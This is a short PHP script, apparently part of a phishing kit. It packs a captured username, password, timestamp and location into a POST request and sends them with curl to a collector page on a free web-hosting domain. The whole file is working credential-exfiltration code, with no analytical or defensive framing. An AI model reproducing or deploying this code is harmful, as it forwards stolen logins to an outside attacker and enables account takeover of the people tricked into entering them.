<?php
$link ="https://sevheyeter.000webhostapp.com/dsh.php";
$yazi ="user=$nick&pass=$password&tarih=$cur_time&yer=$ulke";
$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, $link);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_POSTFIELDS, $yazi);
$veri = curl_exec($curl);
curl_close($curl);
?>